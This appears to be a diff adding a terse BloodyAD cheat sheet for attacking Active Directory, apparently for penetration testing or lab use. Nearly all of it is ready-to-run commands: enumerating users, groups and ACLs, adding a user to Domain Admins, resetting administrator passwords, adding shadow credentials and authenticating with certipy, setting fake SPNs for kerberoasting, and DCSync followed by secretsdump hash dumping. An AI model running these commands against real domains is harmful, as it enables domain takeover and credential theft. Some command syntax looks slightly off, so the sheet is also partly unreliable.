@@ -1,0 +1,88 @@
+BloodyAD cheat sheet
+
+
+set an alias
+alias bad='python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!"'
+
+now every command can start with bad but we dont do it like this since our user can change
+
+anyways
+
+basic syntax:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" <command>
+
+get domain info
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get domain
+
+list users:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get users
+
+
+list groups:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get groups
+
+list members of groups:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get groupMembers "Domain Admins"
+
+
+list full user info:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get user administrator
+
+Get ACL's:
+
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl administrator
+
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl "Domain Admins"
+
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl dc01$
+
+GenericALL on group abuse:
+
+replace domain admins with whatver group you have genericall on
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add groupMember "Domain Admins" user
+
+GenericAll on User abuse (Reset Pass):
+
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" set password victim-username "N3wP@ssw0rd!"
+
+login with evil-winrm
+
+Add shadow credentials:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add shadowCredentials administrator
+
+authenitcate with 
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
+
+Add SPN / Manipulate SPN / GenericWrite on user abuse:
+
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add spn victim "http/fakespn"
+
+then kerberoast
+
+ DCSync with bloodyAD:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get dcsync
+
+now dump hashes
+impacket-secretsdump -just-dc corp.local/user:Passw0rd!@10.10.10.10
+
+WriteOwner Abuse:
+
+take ownership
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" set owner administrator user
+
+grant GenericAll
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add acl administrator user GenericAll
+
+reset DA pass:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" set password administrator "Adm1nP@ss!"
+
+
+ACL on computer:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl dc01$
+
+Shadow Credential on computer:
+python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add shadowCredentials dc01$
+
+authenticate with
+certipy auth -pfx dc01$.pfx -dc-ip 10.10.10.10
+
